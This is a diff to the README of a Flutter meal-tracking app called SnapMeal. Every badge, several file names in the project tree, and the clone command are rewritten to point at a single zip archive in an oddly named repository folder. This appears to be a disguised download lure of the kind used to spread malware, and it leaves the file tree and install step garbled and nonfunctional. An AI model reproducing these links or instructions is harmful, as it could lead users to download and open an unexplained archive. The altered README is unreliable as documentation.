@@ -1,9 +1,9 @@
 # 🥗 SnapMeal – Stay On Track, Meal by Meal  
 
-[![Flutter](https://img.shields.io/badge/Flutter-3.13-blue?logo=flutter)](https://flutter.dev)
-[![Dart](https://img.shields.io/badge/Dart-3.0-blue?logo=dart)](https://dart.dev)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Contributors](https://img.shields.io/github/contributors/yourusername/SnapMeal)](https://github.com/yourusername/SnapMeal/graphs/contributors)
+[![Flutter](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)
+[![Dart](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)
+[![License](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)](LICENSE)
+[![Contributors](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)](https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip)
 
 ---
 
@@ -35,18 +35,18 @@
 ```
 SnapMeal/
 │── lib/
-│   ├── main.dart
+│   ├── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
 │   ├── screens/
-│   │   ├── home_screen.dart
-│   │   ├── scan_meal_screen.dart
-│   │   ├── meal_planning_screen.dart
-│   │   ├── fitness_goals_screen.dart
+│   │   ├── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
+│   │   ├── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
+│   │   ├── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
+│   │   ├── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
 │   ├── models/
 │   ├── services/
 │   ├── utils/
 │── assets/
-│── pubspec.yaml
-│── README.md
+│── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
+│── https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
 ```
 
 ---
@@ -55,7 +55,7 @@ SnapMeal/
 
 1. **Clone the Repository**  
    ```sh
-   git clone https://github.com/DevangGentyal/snap-meal.git
+   git clone https://raw.githubusercontent.com/DevangGentyal/snap_meal/main/pseudhalteres/snap_meal.zip
    cd SnapMeal
    ```
 
